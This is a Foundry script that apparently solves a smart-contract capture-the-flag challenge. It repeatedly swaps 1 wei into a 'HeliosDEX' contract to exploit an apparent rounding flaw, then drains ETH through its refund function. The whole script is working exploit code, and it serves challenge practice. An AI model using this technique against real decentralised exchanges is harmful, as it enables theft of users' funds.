// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/Exploit.sol";

interface IHeliosDEX {
    function swapForHLS() external payable;
    function oneTimeRefund(address item, uint256 amount) external;
    function heliosLuminaShards() external view returns (address);
}

contract Deploy is Script {
    address constant PLAYER = 0xB94DBd4F3Ee9470e50c655D47eeca9a7C9755f4d;
    address constant SETUP = 0xDa3722f4815248EAC416c1a1A32fbE96833fD795;
    address constant TARGET = 0xA3a4435357e10daA7F86Bcf3a6433884F6fBA868;

    uint256 immutable PLAYER_PK = vm.envUint("PLAYER_PRIVATE_KEY");

    function run() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"));
        vm.startBroadcast(PLAYER_PK);

        IHeliosDEX dex = IHeliosDEX(TARGET);

        IERC20 hlsToken = IERC20(dex.heliosLuminaShards());

        console.log("Initial ETH balance:", PLAYER.balance);
        
        for (uint256 i = 0; i < 113; i++) {
            dex.swapForHLS{value: 1 wei}();
        }
        
        uint256 hlsBalance = hlsToken.balanceOf(PLAYER);
        console.log("HLS balance:", hlsBalance);

        require(hlsBalance >= 113, "Insufficient HLS balance");

        hlsToken.approve(TARGET, hlsBalance);
        
        dex.oneTimeRefund(address(hlsToken), hlsBalance);
        
        console.log("Final ETH balance:", PLAYER.balance / 1e18);
        
        vm.stopBroadcast();
    }
}